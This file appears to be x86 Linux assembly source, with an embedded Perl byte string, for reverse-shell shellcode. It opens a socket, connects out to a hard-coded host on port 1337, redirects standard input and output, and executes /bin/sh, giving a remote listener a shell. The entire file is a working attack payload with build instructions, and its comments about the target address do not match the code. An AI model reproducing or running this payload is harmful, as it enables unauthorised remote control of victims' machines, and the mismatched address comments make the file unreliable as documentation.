; Leander Metcalf
; 23 November 2014
; 
; This shellcode will attempt to callback to your socket pair.
; Make sure that your firewall isn't blocking its attempts to
; connect back to you.
;
; nasm -f bin reverse-shell.asm
; 71 Bytes with zero nulls or carriage returns

%comment
my $sc =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\x6a\x66\x58\xcd" . 
"\x80\x83\xc4\x0c\x97\x52\x66\x68\x05\x39\x43\x66\x53\x89\xe1" . 
"\x6a\x10\x51\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x87\xfb" . 
"\x58\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68\x2f\x2f\x73\x68" . 
"\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
# Shellcode Length: 71
# ip = 0.0.0.0 lport = 1337
%endcomment

bits 32
section .text
global _start

_start:
open_socket:
xor	ebx, ebx
mul	ebx
push	ebx
inc	ebx
push	ebx
push	byte 0x2
mov	ecx, esp
push	0x66
pop	eax
int	0x80	
add	esp, 12

connect:
xchg	edi, eax
push	dword 0x66140010	;IP 102.20.0.16
push	word 0x3905	;port: 1337
inc	ebx
push	bx
mov	ecx, esp
push	0x10
push 	ecx
push	edi
mov	ecx, esp
inc	ebx
mov	al, 0x66
int	0x80

mov	ecx, ebx
xchg	edi, ebx
pop 	eax

dup_loop:
mov	al, 0x3f
dec	ecx
int	0x80
inc	ecx
loop	dup_loop

execve:
push	ecx
push	dword 0x68732f2f
push	dword 0x6e69622f
mov	ebx, esp
mov	al, 0xb
int	0x80
